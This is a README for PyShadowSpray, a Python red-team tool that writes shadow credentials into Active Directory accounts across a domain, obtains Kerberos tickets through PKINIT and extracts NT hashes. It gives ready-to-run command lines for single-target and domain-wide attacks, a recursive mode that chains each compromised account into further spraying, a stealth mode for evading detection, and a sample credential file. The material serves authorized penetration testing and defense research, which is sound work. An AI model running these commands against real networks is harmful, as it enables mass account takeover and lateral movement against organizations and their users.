# PyShadowSpray

PyShadowSpray is a Python tool for performing shadow credentials spray attacks against Active Directory environments. It automates the process of adding shadow credentials (via the `msDS-KeyCredentialLink` attribute) to multiple user and computer accounts, then uses PKINIT to obtain TGT tickets and extract NT hashes.

**PyShadowSpray is based on [ShadowSpray](https://github.com/Dec0ne/ShadowSpray)** by Dec0ne, a C# tool for spraying shadow credentials across entire domains. This Python implementation extends the original concept with additional features like Kerberos authentication, recursive spray capabilities, stealth mode, and automated certificate management.

This tool combines the capabilities of [pyWhisker](https://github.com/ShutdownRepo/pywhisker) for shadow credential manipulation with [PKINITtools](https://github.com/dirkjanm/PKINITtools) for TGT retrieval and NT hash extraction, all in an automated spray attack workflow.

## What are Shadow Credentials?

Shadow Credentials is an attack technique that allows an attacker to gain control over a target user or computer account by manipulating the `msDS-KeyCredentialLink` attribute. This attribute stores public key material that can be used for PKINIT (Public Key Cryptography for Initial Authentication in Kerberos) pre-authentication.

**How it works:**
1. An attacker with write permissions to a target account's `msDS-KeyCredentialLink` attribute adds their own public key material
2. The attacker uses this public key (and corresponding private key) to perform PKINIT authentication
3. A TGT (Ticket Granting Ticket) is obtained without knowing the account's password
4. The NT hash can be extracted from the TGT using U2U (User-to-User) or key list attacks

For more detailed information, see:
- [Shadow Credentials: Abusing Key Trust Account Mapping for Takeover](https://eladshamir.com/2021/06/21/Shadow-Credentials.html) by Elad Shamir
- [Exploiting and Detecting Shadow Credentials and msDS-KeyCredentialLink in Active Directory](https://medium.com/@NightFox007/exploiting-and-detecting-shadow-credentials-and-msds-keycredentiallink-in-active-directory-9268a587d204) by NightFox007

## Prerequisites

**Domain Requirements:**
- The target Domain Functional Level must be **Windows Server 2016** or above
- The target domain must have at least one Domain Controller running Windows Server 2016 or above
- The Domain Controller must have its own certificate and keys (requires AD CS, PKI, CA, or similar)

**Why these prerequisites?**
- Prerequisites 1 and 2 are required because PKINIT features were introduced with Windows Server 2016
- Prerequisite 3 is required because the DC needs its own certificate and keys for the session key exchange during the `AS_REQ <-> AS_REP` transaction

A `KRB-ERROR (16) : KDC_ERR_PADATA_TYPE_NOSUPP` error will be raised if prerequisite 3 is not met.

**Attack Requirements:**
- The attacker must have control over an account able to write the `msDS-KeyCredentialLink` attribute of target users or computer accounts
- Computer objects can edit their own `msDS-KeyCredentialLink` attribute but can only add a KeyCredential if none already exists

## Installation

Install via pipx (recommended):
```bash
pipx install git+https://github.com/Coontzy1/PyShadowSpray.git
```

After installation, use the `pyshadowspray` command from anywhere.

Or install locally for development:
```bash
git clone https://github.com/Coontzy1/PyShadowSpray.git
cd PyShadowSpray
pip install -r requirements.txt
python3 PyShadowSpray.py --help
```

## Usage

### Basic Authentication

```bash
# NTLM with password
pyshadowspray -u USERNAME -p PASSWORD -d DOMAIN -dc-ip DC_IP

# NTLM with NT hash
pyshadowspray -u USERNAME --hashes :NTHASH -d DOMAIN -dc-ip DC_IP

# Kerberos authentication
pyshadowspray -k -d DOMAIN -dc-ip DC_IP
# Or with specific ccache file
pyshadowspray -k --ccache /path/to/file.ccache -d DOMAIN -dc-ip DC_IP

```

### Target Operations (Single Account)

```bash
# Add shadow credential to a target user
pyshadowspray -u USER -p PASS -d DOMAIN -dc-ip DC_IP --target USERNAME --add

# List device IDs for a target user
pyshadowspray -u USER -p PASS -d DOMAIN -dc-ip DC_IP --target USERNAME --list

# Remove specific device ID
pyshadowspray -u USER -p PASS -d DOMAIN -dc-ip DC_IP --target USERNAME --remove DEVICEID

# Clear all device IDs from target user
pyshadowspray -u USER -p PASS -d DOMAIN -dc-ip DC_IP --target USERNAME --clear
```

### Spray Operations (Domain-Wide)

```bash
# Basic spray attack (all enabled accounts)
pyshadowspray -u USER -p PASS -d DOMAIN -dc-ip DC_IP --spray

# Recursive spray (automatically uses compromised accounts to continue)
pyshadowspray -u USER -p PASS -d DOMAIN -dc-ip DC_IP --spray --recursive

# Spray with user-pass file (multiple credentials)
pyshadowspray -d DOMAIN -dc-ip DC_IP --spray --user-pass creds.txt

# Stealth mode (only get TGT/ccache files, no NT hash extraction)
pyshadowspray -k -d DOMAIN -dc-ip DC_IP --spray --stealth --recursive

# Cross-domain spray (authenticate in one domain, spray another)
pyshadowspray -u USER -p PASS -d CURRENT_DOMAIN -t TARGET_DOMAIN -dc-ip DC_IP --spray
```

**Important:** During spray operations, each account gets a unique randomly generated 20-character password for its PFX certificate. These passwords are automatically saved to `.password` files for easy reference.

## Options

### Authentication

- `-u, --username TEXT`: Username for LDAP authentication
- `-p, --password TEXT`: Password for LDAP authentication
- `--hashes LMHASH:NTHASH`: LM and NT hashes (format: `LMHASH:NTHASH` or `:NTHASH` for NT hash only). For Kerberos: supports pass-the-hash
- `-d, --domain TEXT`: Domain (required)
- `--dc-ip TEXT`: IP address or FQDN of domain controller
- `-t, --target-domain, --target-domain TEXT`: Target domain for cross-trust spraying. Use when authenticating with credentials from one domain but spraying accounts in another domain
- `--ldaps`: Use LDAPS instead of LDAP (automatically enables channel binding when needed)
- `-k, --kerberos`: Use Kerberos authentication (uses ccache file from KRB5CCNAME environment variable or --ccache option)
- `--ccache TEXT`: Path to ccache file (alternative to KRB5CCNAME environment variable)

### Target Operations (requires --target)

- `--target TEXT`: Target user/computer for shadow credential operations
- `--add`: Add shadow credential to target user
- `--list`: List device IDs for target user
- `--remove DEVICEID`: Remove specific device ID from target user
- `--clear`: Remove ALL device IDs from target user (requires confirmation)

### Spray Operations

- `--spray`: Spray shadow credentials to all enabled users/computers and get NT hashes
- `--user-pass TEXT`: File with username:password pairs (one per line) for spray. Supports both passwords and NT hashes (32-character hex strings)
- `--recursive`: Recursively use compromised accounts to continue spraying. Automatically chains compromised accounts to expand access
- `--stealth`: Stealth mode: Skip NT hash extraction (unpac-the-hash). Only get TGT/ccache files. Useful for recursive operations where you want to avoid noisy hash extraction

### Certificate Export

- `--export [PEM|PFX]`: Certificate format: PEM or PFX (default: PFX)
- `--cert-path TEXT`: Path/filename for certificate export (only applies to single-target `--add` operations)

**Note:** In spray mode, certificate names are automatically generated (`spray_USERNAME.pfx`). In single-target mode, you can specify a custom name with `--cert-path`, or a random 8-character name will be generated if not provided.

**Password Management:**
- In spray mode: Each certificate gets a unique random 20-character password, automatically saved to `spray_USERNAME.password`
- In single-target mode (`--add`): A random 20-character password is generated and saved to `CERTNAME.password`
- Password files are saved in the same directory as the certificate files

### Output/Behavior

- `--output-dir TEXT`: Output directory for certificates, ccache files, and password files (default: `creds`)
- `--no-autoremove`: Do not automatically remove device IDs after PKINIT. By default, device IDs are removed after successful TGT/NT hash extraction to clean up
- `--no-banner`: Do not show banner (useful for screenshots)
- `--debug`: Enable verbose logging and detailed error messages

## Examples

### Example user-pass file format (creds.txt):
```
user1:Password123
user2:AnotherPass456
user3:Password789
user4:aad3b435b51404eeaad3b435b51404ee:41a4838ba3373495144f783e5bd11c
user5:31d6cfe0d16ae931b73c59d7e0c089c0
```

**Notes:**
- One credential per line in `username:password` or `username:hash` format
- The tool automatically detects if a credential is a password or NT hash (32-character hex string)
- If only an NT hash is provided (no LM hash), use the format `:NTHASH` or just `NTHASH`
- Lines starting with `#` are treated as comments and skipped

### Example: Recursive spray with Kerberos
```bash
export KRB5CCNAME=/path/to/ccache
pyshadowspray -k -d DOMAIN -dc-ip DC_IP --spray --recursive
```

This will:
1. Use initial Kerberos ccache to authenticate
2. Spray shadow credentials to all enabled accounts
3. Extract NT hashes from successfully compromised accounts
4. Use newly obtained credentials to continue spraying recursively
5. Save all certificates, password files, and ccache files to the output directory

### Example: Stealth recursive spray
```bash
pyshadowspray -k -d DOMAIN -dc-ip DC_IP --spray --stealth --recursive
```

This will:
1. Use initial Kerberos ccache to authenticate
2. Spray shadow credentials to all enabled accounts
3. Get TGT/ccache files for successfully compromised accounts (no NT hash extraction)
4. Use newly obtained ccache files to continue spraying recursively
5. Useful when you want to avoid noisy hash extraction but still chain access

### Example: Spray with multiple credentials
```bash
pyshadowspray -d DOMAIN -dc-ip DC_IP --spray --user-pass creds.txt --recursive
```

This will:
1. Use each credential from the file to authenticate
2. Spray shadow credentials to all enabled accounts
3. Extract NT hashes from successfully compromised accounts
4. Use newly obtained credentials to continue spraying recursively
5. All credentials from the user-pass file are automatically added to the "already compromised" list to avoid duplicate work

## Output

All output files are saved to the `--output-dir` directory (default: `creds/`):

**Spray Mode:**
- `spray_USERNAME.pfx` - PFX certificates (when using default export format)
- `spray_USERNAME.password` - Random password for the PFX certificate (20 characters)
- `spray_USERNAME_cert.pem` / `spray_USERNAME_priv.pem` - PEM format certificates (when using `--export PEM`)
- `USERNAME.ccache` - Kerberos ccache files (when using stealth mode or Kerberos authentication)
- `device_ids.log` - Log of all device ID operations (ADD/REMOVE)

**Single-Target Mode (`--add`):**
- `CERTNAME.pfx` or custom name from `--cert-path` - PFX certificate
- `CERTNAME.password` - Random password for the PFX certificate (20 characters)
- `CERTNAME_cert.pem` / `CERTNAME_priv.pem` - PEM format certificates (when using `--export PEM`)
- `USERNAME.ccache` - Kerberos ccache file (if TGT extraction is performed)

**Log File (`device_ids.log`):**
Contains entries in the format:
```
[2024-01-01 12:00:00] ADD: username | DeviceID: 12345678-1234-1234-1234-123456789abc | Status: SUCCESS
[2024-01-01 12:00:05] REMOVE: username | DeviceID: 12345678-1234-1234-1234-123456789abc | Status: SUCCESS
```

## Important Notes

- When using `--kerberos` / `-k`, credentials are obtained from `--ccache` file or `KRB5CCNAME` environment variable
- Without `-k` flag, normal NTLM authentication is used (even if ccache exists)
- Initial credentials from `--user-pass` file are automatically added to "already compromised" list
- Domain Admin and Domain Controller identification happens once at the start (optimized for recursive operations)
- Domain Admins and Domain Controllers are automatically excluded from recursive spray operations
- User objects can't edit their own `msDS-KeyCredentialLink` attribute. However, **computer objects can**
- Computer objects can edit their own `msDS-KeyCredentialLink` attribute but **can only add a KeyCredential if none already exists**
- Make sure there is no time skew between your attacker host and the Key Distribution Center (usually the Domain Controller)
- Certificates generated by PyShadowSpray are valid 40 years before and after the current date to avoid time-related errors
- PFX passwords are automatically generated and saved to `.password` files - keep these files secure!
- By default, device IDs are automatically removed after successful PKINIT/NT hash extraction. Use `--no-autoremove` to keep them

## Credits and References

### Original Tools and Research

This tool builds upon the excellent work of the following projects and researchers:

**ShadowSpray** - Original C# tool for shadow credentials spray attacks across entire domains
- Repository: https://github.com/Dec0ne/ShadowSpray
- Created by Dec0ne
- PyShadowSpray is based on the concept and approach of ShadowSpray, adapted to Python with additional features

**pyWhisker** - Python version of the C# tool for "Shadow Credentials" attacks
- Repository: https://github.com/ShutdownRepo/pywhisker
- Credits to the pyWhisker team for the shadow credential manipulation functionality

**PKINITtools** - Tools for PKINIT authentication and NT hash extraction
- Repository: https://github.com/dirkjanm/PKINITtools
- Authors:
  - Alberto Solino (@agsolino)
  - Dirk-jan Mollema (@_dirkjan)
  - Tamas Jos (@skelsec)
- PyShadowSpray uses code derived from `gettgtpkinit.py` and `getnthash.py` from PKINITtools

**Whisker** - Original C# tool for Shadow Credentials
- Created by Elad Shamir
- PyShadowSpray is inspired by the original Whisker tool

**DSInternals** - Library for Active Directory operations
- Created by Michael Grafnetter
- Used by pyWhisker for shadow credential manipulation

### Research and Documentation

- **Shadow Credentials: Abusing Key Trust Account Mapping for Takeover** by Elad Shamir
  - https://eladshamir.com/2021/06/21/Shadow-Credentials.html
  
- **Exploiting and Detecting Shadow Credentials and msDS-KeyCredentialLink in Active Directory** by NightFox007
  - https://medium.com/@NightFox007/exploiting-and-detecting-shadow-credentials-and-msds-keycredentiallink-in-active-directory-9268a587d204

- **The Hacker Recipes** - Excellent documentation on ACEs abuse and Shadow Credentials
  - https://www.thehacker.recipes/

## License

This project is licensed under the MIT License.

## Disclaimer

This tool is for authorized security testing and educational purposes only. Unauthorized access to computer systems is illegal. The authors and contributors are not responsible for any misuse of this tool.